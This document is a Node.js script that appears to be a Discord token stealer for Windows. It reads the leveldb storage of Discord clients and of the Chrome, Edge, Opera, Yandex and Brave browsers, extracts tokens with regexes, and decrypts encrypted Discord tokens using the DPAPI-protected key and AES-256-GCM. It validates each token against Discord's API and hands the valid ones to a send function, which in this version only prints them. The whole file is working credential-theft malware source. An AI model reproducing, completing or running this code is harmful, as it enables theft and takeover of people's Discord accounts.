const fs = require("fs");
const crypto = require("crypto");
const aura = require("win-dpapi");
const axios = require('axios');

let tokens = new Array();

switch (process.platform) {
    case "win32":
        let appdata = process.env.appdata;
        let localappdata = process.env.localappdata;
        
        let paths = [
            `${appdata}/discord/`,
            `${appdata}/discordcanary/`,
            `${appdata}/discordptb/`,
            `${appdata}/discorddevelopment/`,
            `${appdata}/lightcord/`,
            `${appdata}/Opera Software/Opera Stable/`,
            `${appdata}/Opera Software/Opera GX Stable/`,
            `${localappdata}/Google/Chrome/User Data/Default/`,
            `${localappdata}/Google/Chrome/User Data/Profile 1/`,
            `${localappdata}/Google/Chrome/User Data/Profile 2/`,
            `${localappdata}/Google/Chrome/User Data/Profile 3/`,
            `${localappdata}/Google/Chrome/User Data/Profile 4/`,
            `${localappdata}/Google/Chrome/User Data/Profile 5/`,
            `${localappdata}/Google/Chrome/User Data/Guest Profile/`,
            `${localappdata}/Google/Chrome/User Data/Default/Network/`,
            `${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
            `${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
            `${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
            `${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
            `${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
            `${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Default/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
            `${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
            `${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
            `${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/Network/`,
            `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/Network/`,
            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/Network/`,
        ];

        async function tokenfuck() {
            for (let p of paths) {
                await find(p);
            };
            ok = tokens
            await check(ok)
        }

        async function find(p) {
            let tail = p;
            p += 'Local Storage/leveldb';

            if (!tail.includes('discord')) {
                try {
                    fs.readdirSync(p).map(f => {
                        (f.endsWith('.log') || f.endsWith('.ldb')) && fs.readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                            const patterns = [
                                new RegExp(/mfa\.[\w-]{84}/g), 
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const p of patterns) {
                                const foundTkns = l.match(p);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        if (!tokens.includes(tkn)) return tokens.push(tkn)
                                    });
                                }
                            }
                        });
                    });
                } catch (e) {}
                return;
            } else {
                if (fs.existsSync(`${tail}/Local State`)) {
                    try {
                        fs.readdirSync(p).map(f => {
                            (f.endsWith('.log') || f.endsWith('.ldb')) && fs.readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTkns = l.match(pattern);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        let enc = Buffer.from(JSON.parse(fs.readFileSync(`${tail}/Local State`)).os_crypt.encrypted_key, 'base64').slice(5);
                                        let key = aura.unprotectData(Buffer.from(enc, 'utf-8'), null, 'CurrentUser');
                                        const tkns = Buffer.from(tkn.split('dQw4w9WgXcQ:')[1], 'base64');
                                        let run = tkns.slice(3, 15), mid = tkns.slice(15, tkns.length - 16); 
                                        let decyph = crypto.createDecipheriv('aes-256-gcm', key, run); decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));
                                        let out = decyph.update(mid, 'base64', 'utf-8') + decyph.final('utf-8');
                                        if (!tokens.includes(out)) return tokens.push(out)
                                    })
                                };
                            });
                        });
                    } catch (e) {}
                    return;
                }
            }
        }
        tokenfuck()

        async function check(t) {
            for (let tkn of t) {
                await axios.get(`https://discord.com/api/v9/users/@me`, {
                    headers: {
                        "Content-Type": "application/json",
                        "authorization": `${tkn}`
                    }
                }).then(r => {
                    usr = r.data
                }).catch(() => {
                    usr = null
                })

                if (!usr) continue;
                if (tkn) await send(tkn)
            }
        }

        async function send(k4itrun) {
            console.log(k4itrun)
        }
        break
    default: break
}